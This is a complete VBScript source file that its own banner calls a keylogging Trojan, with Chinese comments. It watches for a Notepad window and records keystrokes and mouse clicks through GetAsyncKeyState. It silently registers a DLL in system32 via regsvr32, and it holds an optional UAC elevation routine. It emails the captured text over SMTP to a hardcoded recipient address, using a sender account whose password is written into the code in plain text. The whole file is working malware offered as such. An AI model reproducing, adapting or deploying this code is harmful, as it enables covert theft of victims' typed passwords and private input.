Option Explicit


'_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/
'_/                                                                                      _/
'_/             This is a simple keyboard recording type of Trojan model                 _/
'_/                                                                                      _/
'_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/_/





'Call DoUACRunScript()		'提升脚本权限

'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
'+++ 初始化配置区域:

'**************************************** 参数设置 ****************************************

Const WINDOW_TITLE		= "无标题 - 记事本"		'要监视的程序的窗口标题文字
Const PROCESS_NAME		= "notepad.exe"			'要监视的程序的进程名称
Const SENDER_MAIL_ADDR	= "fx7ffa4512@163.com"		'用于发送邮件的邮箱地址
Const SENDER_MAIL_PWD	= "wy20110202"			'用于发送邮件的邮箱密码
Const SENDEE_MAIL_ADDR	= "776248550@qq.com"	'用于接收邮件的邮箱地址

'******************************** 注册要使用的Win32API函数 ********************************

Dim strDllPath
strDllPath = Replace(WScript.ScriptFullName,WScript.ScriptName,"dynwrap.dll")	'获取DLL文件的绝对路径
RegisterCOM strDllPath 		'注册DynamicWrapper组件
WScript.Sleep 2000

Dim g_objConnectAPI
Set g_objConnectAPI = CreateObject("DynamicWrapper")	'创建全局的DynamicWrapper组件对象实例

'以下为声明将要用到的Win32API函数
With g_objConnectAPI
	.Register "user32.dll","FindWindow","i=ss","f=s","r=l"
	.Register "user32.dll","GetForegroundWindow","f=s","r=l"
	.Register "user32.dll","GetAsyncKeyState","i=l","f=s","r=l"
End With

'+++
'++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



'******************************************************************************************
'*** 程序主体流程区域:

'循环监视指定窗口
Do
	If IsFoundWindowTitle() And IsTheWindowActive() Then Exit Do	'当指定窗口存在且为当前激活窗口跳出循环
	WScript.Sleep 500
Loop


Dim TheKeyResult	'用于保存键盘记录的结果
TheKeyResult = ""

'开始循环记录按键，当窗口出于非激活状态后或者用户输入回车键后停止记录按键
Do
	If Not IsTheWindowActive() Then Exit Do
	Dim TheKey
	TheKey = ""
	TheKey = GetThePressKey()
	TheKeyResult = TheKeyResult & TheKey
	WScript.Sleep 20
Loop Until TheKey = "[ENTER]"

'MsgBox TheKeyResult,vbSystemModal,"按键信息"

SendEmail SENDER_MAIL_ADDR,SENDER_MAIL_PWD,SENDEE_MAIL_ADDR,"","按键内容",TheKeyResult,""		'发送按键信息的邮件

'CreateLogFile TheKeyResult		'以日志形式保存所记录的按键信息
Dim SP
Set SP=CreateObject("SAPI.SpVoice")
SP.Speak "All Work Down!"
'***
'******************************************************************************************






'------------------------------------------以下为函数定义区域-------------------------------------------


'检测WINDOW_TITLE所指定标题文字的窗口是否存在
Function IsFoundWindowTitle()

	Dim hWnd
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	IsFoundWindowTitle = CBool(hWnd)
	
End Function

'检测WINDOW_TITLE所指定标题文字的窗口是否为当前激活的窗口
Function IsTheWindowActive()

	Dim hWnd,hAct
	hWnd = g_objConnectAPI.FindWindow(vbNullString,WINDOW_TITLE)
	hAct = g_objConnectAPI.GetForegroundWindow()
	IsTheWindowActive = CBool(hWnd=hAct)
	
End Function


'检查当前进程列表中是否存在指定的进程
Function IsExistProcess(strProcessName)

	Dim objWMIService
	Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
	Dim colProcessList
	Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name='" & strProcessName & "'")
	IsExistProcess = CBool(colProcessList.Count)

End Function


'发送邮件
Function SendEmail(SenderAddress, SenderPassword, SendeeAddress, BackupAddress, MailTitle, MailContent, MailAttachment)
	Const MS_Space = "http://schemas.microsoft.com/cdo/configuration/"	'配置空间
	
	Dim objEmail
	Set objEmail = CreateObject("CDO.Message")
	Dim strSenderID
	strSenderID = Split(SenderAddress,"@",-1,vbTextCompare)
	
	objEmail.From = SenderAddress	'寄件人地址
	objEmail.To = SendeeAddress 	'收件人地址
	If BackupAddress <> "" Then
		objEmail.CC = BackupAddress '备用地址
	End If
	objEmail.Subject = MailTitle	'邮件主题
	objEmail.TextBody = MailContent '邮件内容
	If MailAttachment <> "" Then
		objEmail.AddAttachment MailAttachment	'附件地址
	End If
	
	With objEmail.Configuration.Fields
		
		.Item(MS_Space & "sendusing") = 2							'发信端口
		.Item(MS_Space & "smtpserver") = "smtp." & strSenderID(1)	'发信服务器
		.Item(MS_Space & "smtpserverport") = 25						'SMTP服务器端口
		.Item(MS_Space & "smtpauthenticate") = 1 					'CDObasec
		.Item(MS_Space & "sendusername") = strSenderID(0)			'寄件人邮箱账户名
		.Item(MS_Space & "sendpassword") = SenderPassword			'帐户名密码	
		.Update
		
	End With
	
	objEmail.Send	'发送邮件
	
	Set objEmail = Nothing
	SendEmail = True
	
	If Err Then
		Err.Clear
		SendEmail = False
	End If
	
End Function


'建立记录日志
Sub CreateLogFile(strLogContent)
	
	Dim objFSO
	Dim objWshShell
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWshShell = CreateObject("Wscript.Shell")
	Dim CurrentDirectory
	CurrentDirectory = objWshShell.CurrentDirectory & "\"
	Set objWshShell = Nothing
	
	Dim objLogFile
	Set objLogFile = objFSO.OpenTextFile(CurrentDirectory & "RecordingLog.txt",8,True)
	Set objFSO = Nothing
	objLogFile.WriteLine("记录时间----> " & Now() & " :")
	objLogFile.WriteLine()
	objLogFile.WriteLine(strLogContent)
	objLogFile.Close
	
End Sub


'注册组件
Sub RegisterCOM(strSource)

	Dim objFSO
	Dim objWshShell
	Set objFSO = CreateObject("Scripting.FileSystemObject")
	Set objWshShell = CreateObject("Wscript.Shell")
	Dim strSystem32Dir
	strSystem32Dir = objWshShell.ExpandEnvironmentStrings("%WinDir%") & "\system32\"
	
	If objFSO.FileExists(strSystem32Dir & "dynwrap.dll") Then Exit Sub
	objFSO.CopyFile strSource,strSystem32Dir,True
	
	WScript.Sleep 1000
	Dim blnComplete
	blnComplete = False
	Do
		If objFSO.FileExists(strSystem32Dir & "dynwrap.dll") Then
			objWshShell.Run "regsvr32 /s " & strSystem32Dir & "dynwrap.dll"
			blnComplete = True
		End If
	Loop Until blnComplete
	WScript.Sleep 2000		'延迟2秒退出函数
End Sub


'在系统为Win7或Vista时提升VBS脚本权限
Sub DoUACRunScript()
	
	Dim objOS
	For Each objOS in GetObject("winmgmts:").InstancesOf("Win32_OperatingSystem") 
		If InStr(objOS.Caption,"XP") = 0 Then 
			If WScript.Arguments.length = 0 Then 
				Dim objShell 
				Set objShell = CreateObject("Shell.Application")
				objShell.ShellExecute "wscript.exe", Chr(34) &_
				WScript.ScriptFullName & Chr(34) & " uac", "", "runas", 1
			End If
		End If
	Next
	
End Sub


'获取键盘上被按下的键
Function GetThePressKey()
	
	With g_objConnectAPI
	
	    If .GetAsyncKeyState(13) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(17) = -32767 Then
		    GetThePressKey = "[CTRL]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(8) = -32767 Then
		    GetThePressKey = "[BACKSPACE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(9) = -32767 Then
		    GetThePressKey = "[TAB]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(18) = -32767 Then
		    GetThePressKey = "[ALT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(19) = -32767 Then
		    GetThePressKey = "[PAUSE]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(20) = -32767 Then
		    GetThePressKey = "[CAPS LOCK]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(27) = -32767 Then
		    GetThePressKey = "[ESC]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(33) = -32767 Then
		    GetThePressKey = "[PAGE UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(34) = -32767 Then
		    GetThePressKey = "[PAGE DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(35) = -32767 Then
		    GetThePressKey = "[END]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(36) = -32767 Then
		    GetThePressKey = "[HOME]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(44) = -32767 Then
		    GetThePressKey = "[SYSRQ]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(45) = -32767 Then
		    GetThePressKey = "[INS]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(46) = -32767 Then
		    GetThePressKey = "[DEL]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(144) = -32767 Then
		    GetThePressKey = "[NUM LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(145) = -32767 Then
		    GetThePressKey = "[SCROLL LOCK]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(37) = -32767 Then
		    GetThePressKey = "[LEFT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(38) = -32767 Then
		    GetThePressKey = "[UP]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(39) = -32767 Then
		    GetThePressKey = "[RIGHT]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(40) = -32767 Then
		    GetThePressKey = "[DOWN]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(112) = -32767 Then
		    GetThePressKey = "[F1]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(113) = -32767 Then
		    GetThePressKey = "[F2]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(114) = -32767 Then
		    GetThePressKey = "[F3]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(115) = -32767 Then
		    GetThePressKey = "[F4]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(116) = -32767 Then
		    GetThePressKey = "[F5]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(117) = -32767 Then
		    GetThePressKey = "[F6]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(118) = -32767 Then
		    GetThePressKey = "[F7]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(119) = -32767 Then
		    GetThePressKey = "[F8]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(120) = -32767 Then
		    GetThePressKey = "[F9]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(121) = -32767 Then
		    GetThePressKey = "[F10]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(122) = -32767 Then
		    GetThePressKey = "[F11]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(123) = -32767 Then
		    GetThePressKey = "[F12]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(124) = -32767 Then
		    GetThePressKey = "[F13]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(125) = -32767 Then
		    GetThePressKey = "[F14]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(126) = -32767 Then
		    GetThePressKey = "[F15]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(127) = -32767 Then
		    GetThePressKey = "[F16]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(32) = -32767 Then
		    GetThePressKey = "[空格]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(186) = -32767 Then
		    GetThePressKey = ";"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(187) = -32767 Then
		    GetThePressKey = "="
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(188) = -32767 Then
		    GetThePressKey = ","
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(189) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(190) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(191) = -32767 Then
		    GetThePressKey = "/"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(192) = -32767 Then
		    GetThePressKey = "`"
		    Exit Function
	    End If
	  
	    '----------NUM PAD----------
	    If .GetAsyncKeyState(96) = -32767 Then
		    GetThePressKey = "0"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(97) = -32767 Then
		    GetThePressKey = "1"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(98) = -32767 Then
		    GetThePressKey = "2"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(99) = -32767 Then
		    GetThePressKey = "3"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(100) = -32767 Then
		    GetThePressKey = "4"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(101) = -32767 Then
		    GetThePressKey = "5"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(102) = -32767 Then
		    GetThePressKey = "6"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(103) = -32767 Then
		    GetThePressKey = "7"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(104) = -32767 Then
	    	GetThePressKey = "8"
	    	Exit Function
	    End If
	  
	    If .GetAsyncKeyState(105) = -32767 Then
		    GetThePressKey = "9"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(106) = -32767 Then
		    GetThePressKey = "*"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(107) = -32767 Then
		    GetThePressKey = "+"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(108) = -32767 Then
		    GetThePressKey = "[ENTER]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(109) = -32767 Then
		    GetThePressKey = "-"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(110) = -32767 Then
		    GetThePressKey = "."
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(&H1) = -32767 Then
		    GetThePressKey = "[鼠标左键]"
		    Exit Function
	    End If
		
	    If .GetAsyncKeyState(&H4) = -32767 Then
		    GetThePressKey = "[鼠标中键]"
		    Exit Function
	    End If		
		
	    If .GetAsyncKeyState(&H2) = -32767 Then
		    GetThePressKey = "[鼠标右键]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(220) = -32767 Then
		    GetThePressKey = "\"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(222) = -32767 Then
		    GetThePressKey = "'"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(221) = -32767 Then
		    GetThePressKey = "[右方括号]"
		    Exit Function
	    End If
	  
	    If .GetAsyncKeyState(219) = -32767 Then
		    GetThePressKey = "[左方括号]"
		    Exit Function
	    End If
	  	
	    If .GetAsyncKeyState(16) = -32767 Then
		    GetThePressKey = "[SHIFT]"
		    Exit Function
	    End If
	  		  	
	    If .GetAsyncKeyState(65) = -32767 Then
		    GetThePressKey = "A"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(66) = -32767 Then
		    GetThePressKey = "B"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(67) = -32767 Then
		    GetThePressKey = "C"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(68) = -32767 Then
		    GetThePressKey = "D"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(69) = -32767 Then
		    GetThePressKey = "E"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(70) = -32767 Then
		    GetThePressKey = "F"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(71) = -32767 Then
		    GetThePressKey = "G"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(72) = -32767 Then
		    GetThePressKey = "H"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(73) = -32767 Then
		    GetThePressKey = "I"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(74) = -32767 Then
		    GetThePressKey = "J"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(75) = -32767 Then
		    GetThePressKey = "K"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(76) = -32767 Then
		    GetThePressKey = "L"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(77) = -32767 Then
		    GetThePressKey = "M"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(78) = -32767 Then
		    GetThePressKey = "N"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(79) = -32767 Then
		    GetThePressKey = "O"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(80) = -32767 Then
		    GetThePressKey = "P"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(81) = -32767 Then
		    GetThePressKey = "Q"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(82) = -32767 Then
		    GetThePressKey = "R"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(83) = -32767 Then
		    GetThePressKey = "S"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(84) = -32767 Then
		    GetThePressKey = "T"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(85) = -32767 Then
		    GetThePressKey = "U"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(86) = -32767 Then
		    GetThePressKey = "V"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(87) = -32767 Then
		    GetThePressKey = "W"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(88) = -32767 Then
		    GetThePressKey = "X"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(89) = -32767 Then
		    GetThePressKey = "Y"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(90) = -32767 Then
		    GetThePressKey = "Z"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(48) = -32767 Then
		    GetThePressKey = "[0]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(49) = -32767 Then
		    GetThePressKey = "[1]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(50) = -32767 Then
		    GetThePressKey = "[2]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(51) = -32767 Then
		    GetThePressKey = "[3]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(52) = -32767 Then
		    GetThePressKey = "[4]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(53) = -32767 Then
		    GetThePressKey = "[5]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(54) = -32767 Then
		    GetThePressKey = "[6]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(55) = -32767 Then
		    GetThePressKey = "[7]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(56) = -32767 Then
		    GetThePressKey = "[8]"
		    Exit Function
	    End If
	    
	    If .GetAsyncKeyState(57) = -32767 Then
		    GetThePressKey = "[9]"
		    Exit Function
	    End If

	End With

End Function
